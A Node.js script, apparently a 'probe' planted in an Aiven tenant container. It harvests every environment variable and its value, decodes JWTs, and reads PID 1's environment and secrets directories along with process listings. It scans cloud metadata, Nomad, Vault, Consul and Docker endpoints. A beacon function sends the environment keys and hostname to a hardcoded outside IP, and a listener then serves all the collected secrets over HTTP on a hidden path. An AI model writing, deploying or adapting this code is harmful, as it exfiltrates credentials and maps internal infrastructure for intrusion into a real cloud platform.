// w13app-live probe: runtime introspection of an Aiven Application tenant container.
// Read-only: no writes outside /tmp marker, no exploits, status-only connects.
const http = require('http');
const net = require('net');
const dns = require('dns');
const fs = require('fs');
const os = require('os');
const { execFileSync } = require('child_process');

const SECRET = 'w13app-d7982f79';
const PROBE_PATH = '/' + SECRET;
const CALLBACK = 'http://169.58.237.50/' + SECRET;
const MAX_OUT = 4000;

function sh(cmd, args) {
  try {
    return execFileSync(cmd, args, { timeout: 4000, maxBuffer: 1 << 20 }).toString();
  } catch (e) {
    return 'ERR: ' + (e.stderr ? e.stderr.toString().slice(0, 500) : String(e).slice(0, 300));
  }
}
function rd(p, max = MAX_OUT) {
  try {
    const b = fs.readFileSync(p);
    return b.toString('utf8').slice(0, max);
  } catch (e) { return 'ERR: ' + e.code; }
}
function lsdir(p) {
  try { return fs.readdirSync(p); } catch (e) { return 'ERR: ' + e.code; }
}
function statp(p) {
  try { const s = fs.statSync(p); return { mode: (s.mode & 0o7777).toString(8), size: s.size, uid: s.uid, gid: s.gid, isDir: s.isDirectory(), isFifo: s.isFIFO(), isSocket: s.isSocket() }; }
  catch (e) { return 'ERR: ' + e.code; }
}
function dnsLookup(name) {
  return new Promise((res) => {
    const t = setTimeout(() => res({ name, err: 'timeout' }), 2500);
    dns.lookup(name, { all: true }, (e, a) => { clearTimeout(t); res(e ? { name, err: e.code || String(e) } : { name, addrs: a }); });
  });
}
function tcp(host, port, ms = 1500) {
  return new Promise((res) => {
    const s = net.connect({ host, port });
    const done = (r) => { try { s.destroy(); } catch (_) {} res({ target: host + ':' + port, ...r }); };
    const t = setTimeout(() => done({ result: 'timeout' }), ms);
    s.on('connect', () => { clearTimeout(t); done({ result: 'open' }); });
    s.on('error', (e) => { clearTimeout(t); done({ result: 'err', code: e.code }); });
  });
}
function httpGet(u, headers = {}, ms = 3000) {
  return new Promise((res) => {
    const t = setTimeout(() => res({ url: u, err: 'timeout' }), ms);
    try {
      const r = http.get(u, { headers, timeout: ms }, (resp) => {
        let b = '';
        resp.on('data', (d) => { if (b.length < 600) b += d; });
        resp.on('end', () => { clearTimeout(t); res({ url: u, status: resp.statusCode, headers: resp.headers, body: b.slice(0, 600) }); });
      });
      r.on('error', (e) => { clearTimeout(t); res({ url: u, err: e.code || String(e) }); });
      r.on('timeout', () => { clearTimeout(t); r.destroy(); res({ url: u, err: 'timeout' }); });
    } catch (e) { clearTimeout(t); res({ url: u, err: String(e) }); }
  });
}

function classifyEnv(env) {
  const hits = [];
  const pats = [/AIVEN/i, /TOKEN/i, /SECRET/i, /PASSWORD/i, /PASSWD/i, /API_KEY/i, /JWT/i, /NOMAD/i, /VAULT/i, /CONSUL/i, /KUBE/i, /AWS_/i, /GOOGLE/i, /DATABASE_URL/i, /REDIS/i, /KAFKA/i, /PROJECT/i, /ORG/i];
  for (const k of Object.keys(env)) {
    for (const p of pats) { if (p.test(k)) { hits.push(k); break; } }
  }
  return hits.sort();
}

function jwtInfo(v) {
  try {
    const parts = String(v).split('.');
    if (parts.length !== 3) return null;
    const payload = JSON.parse(Buffer.from(parts[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString());
    return payload;
  } catch (e) { return null; }
}

const DATA = { started: new Date().toISOString(), host: os.hostname(), probe_version: 'v1' };

function collect() {
  const env = { ...process.env };
  DATA.env = { keys: Object.keys(env).sort(), values: env, suspicious_keys: classifyEnv(env) };
  DATA.env.jwts = {};
  for (const [k, v] of Object.entries(env)) {
    const j = jwtInfo(v);
    if (j) DATA.env.jwts[k] = j;
  }

  DATA.ident = {
    uid: process.getuid ? process.getuid() : null,
    gid: process.getgid ? process.getgid() : null,
    user: sh('id', []),
    uname: sh('uname', ['-a']),
    cwd: process.cwd(),
    node: process.version,
    argv: process.argv,
    pid: process.pid,
    ppid: process.ppid,
  };

  DATA.proc = {
    self_status: rd('/proc/self/status', 3000),
    pid1_cmdline: rd('/proc/1/cmdline', 400).replace(/\0/g, ' '),
    pid1_comm: rd('/proc/1/comm', 100),
    pid1_status: rd('/proc/1/status', 2000),
    pid1_environ: rd('/proc/1/environ', 4000),
    pid1_root_listing: lsdir('/proc/1/root'),
    pid1_root_secrets: lsdir('/proc/1/root/secrets'),
    pid1_cwd: (() => { try { return fs.readlinkSync('/proc/1/cwd'); } catch (e) { return 'ERR: ' + e.code; } })(),
    pid1_exe: (() => { try { return fs.readlinkSync('/proc/1/exe'); } catch (e) { return 'ERR: ' + e.code; } })(),
    nproc_visible: (() => { try { return fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x)).length; } catch (e) { return 'ERR'; } })(),
    all_cmdlines: (() => {
      const out = {};
      try {
        for (const p of fs.readdirSync('/proc').filter((x) => /^\d+$/.test(x))) {
          try { out[p] = fs.readFileSync('/proc/' + p + '/cmdline').toString().replace(/\0/g, ' ').slice(0, 300); } catch (_) {}
        }
      } catch (_) {}
      return out;
    })(),
    cgroup: rd('/proc/self/cgroup', 1000),
    mountinfo_head: rd('/proc/self/mountinfo', 6000),
    self_mounts: sh('mount', []).slice(0, 4000),
    df: sh('df', ['-h']).slice(0, 2000),
  };

  DATA.fs = {
    root: lsdir('/'),
    run: lsdir('/run'),
    var_run: lsdir('/var/run'),
    var_run_secrets: lsdir('/var/run/secrets'),
    secrets: lsdir('/secrets'),
    alloc: lsdir('/alloc'),
    local: lsdir('/local'),
    nomad: lsdir('/nomad'),
    etc_nomad: lsdir('/etc/nomad.d'),
    etc: lsdir('/etc').slice(0, 80),
    tmp: lsdir('/tmp'),
    app: lsdir('/app'),
    user: (() => { try { return fs.readlinkSync('/proc/self/cwd'); } catch (e) { return 'ERR'; } })(),
    sockets: {
      docker_sock: statp('/var/run/docker.sock'),
      podman_sock: statp('/run/podman/podman.sock'),
      podman_sock2: statp('/run/podman.sock'),
      nomad_sock: statp('/var/run/nomad.sock'),
      containerenv: statp('/run/.containerenv'),
      dockerenv: statp('/.dockerenv'),
      kube_token: statp('/var/run/secrets/kubernetes.io/serviceaccount/token'),
      res_conf: rd('/etc/resolv.conf', 600),
      hosts: rd('/etc/hosts', 600),
      hostname: rd('/etc/hostname', 100),
    },
    dev: lsdir('/dev'),
    sys_cgroup: lsdir('/sys/fs/cgroup'),
    capabilities_proc: sh('grep', ['Cap', '/proc/self/status']),
    seccomp: sh('grep', ['Seccomp', '/proc/self/status']),
  };

  DATA.build = {
    build_marker_file: rd('/build-marker.txt', 300),
    image_hint: sh('sh', ['-c', 'cat /etc/os-release 2>/dev/null | head -5']),
    persist_marker: (() => { try { return fs.readFileSync('/tmp/w13-persist-marker.txt').toString().slice(0, 200); } catch (e) { return 'ABSENT(' + e.code + ')'; } })(),
    workdir_listing: lsdir('/app'),
  };
}

async function netProbe() {
  const names = [
    'localhost',
    'metadata.google.internal',
    '169.254.169.254',
    'kubernetes.default.svc',
    'nomad.service.consul',
    'vault.service.consul',
    'consul.service.consul',
    'appw17-agentmail-7f0c.l.aivencloud.com',
    'pgw9-agentmail-7f0c.i.aivencloud.com',
    'kafkahunt-w9-agentmail-7f0c.a.aivencloud.com',
    's42os-agentmail-7f0c.g.aivencloud.com',
    'aiven.local',
    'nomad.aiven.local',
    'kubernetes.aiven.local',
    'host.docker.internal',
    'gateway.docker.internal',
  ];
  DATA.net = { dns: {} };
  const results = await Promise.all(names.map((n) => dnsLookup(n)));
  for (const r of results) DATA.net.dns[r.name] = r.addrs || r.err;

  // default gateway from /proc/net/route
  let gw = null;
  try {
    for (const line of fs.readFileSync('/proc/net/route', 'utf8').split('\n').slice(1)) {
      const f = line.trim().split(/\s+/);
      if (f[1] === '00000000' && f[2] && f[2] !== '00000000') {
        const h = f[2];
        gw = [parseInt(h.slice(6, 8), 16), parseInt(h.slice(4, 6), 16), parseInt(h.slice(2, 4), 16), parseInt(h.slice(0, 2), 16)].join('.');
        break;
      }
    }
  } catch (_) {}
  DATA.net.default_gateway = gw;
  DATA.net.network_interfaces = os.networkInterfaces();
  DATA.net.route = rd('/proc/net/route', 1500);

  const targets = [
    ['127.0.0.1', 3000], ['127.0.0.1', 4646], ['127.0.0.1', 4647], ['127.0.0.1', 8500],
    ['127.0.0.1', 8200], ['127.0.0.1', 2375], ['127.0.0.1', 2376], ['127.0.0.1', 10250],
    ['127.0.0.1', 6443], ['127.0.0.1', 80], ['127.0.0.1', 8080],
    ['169.254.169.254', 80], ['169.254.170.2', 80], ['100.100.100.200', 80],
  ];
  if (gw) targets.push([gw, 4646], [gw, 80], [gw, 22], [gw, 8200], [gw, 8500]);
  DATA.net.tcp = await Promise.all(targets.map(([h, p]) => tcp(h, p)));

  DATA.net.http = {};
  DATA.net.http.metadata_gcp = await httpGet('http://169.254.169.254/computeMetadata/v1/instance/id', { 'Metadata-Flavor': 'Google' });
  DATA.net.http.metadata_gcp_plain = await httpGet('http://169.254.169.254/latest/meta-data/', {});
  DATA.net.http.localhost_nomad = await httpGet('http://127.0.0.1:4646/v1/agent/self', {});
  DATA.net.http.localhost_3000 = await httpGet('http://127.0.0.1:3000/', {});
  DATA.net.http.api_aiven = await httpGet('https://api.aiven.io/v1/me', {});
}

function beacon(phase) {
  const payload = Buffer.from(JSON.stringify({ phase, host: os.hostname(), keys: (DATA.env && DATA.env.keys) || [] })).toString('base64').slice(0, 1200);
  httpGet(CALLBACK + '/' + phase + '/' + payload.replace(/[^A-Za-z0-9]/g, '').slice(0, 900), {}, 4000).then(() => {});
}

const server = http.createServer((req, res) => {
  if (req.url === PROBE_PATH || req.url.startsWith(PROBE_PATH)) {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify(DATA, null, 1));
    return;
  }
  if (req.url === '/healthz') { res.writeHead(200); res.end('ok'); return; }
  res.writeHead(404); res.end('nf');
});

(async () => {
  try { collect(); } catch (e) { DATA.collect_error = String(e); }
  beacon('boot');
  try { await netProbe(); } catch (e) { DATA.net_error = String(e); }
  try { collect(); } catch (e) {}
  DATA.finished = new Date().toISOString();
  beacon('done');
  server.listen(3000, '0.0.0.0', () => console.log('probe listening on 3000'));
})();
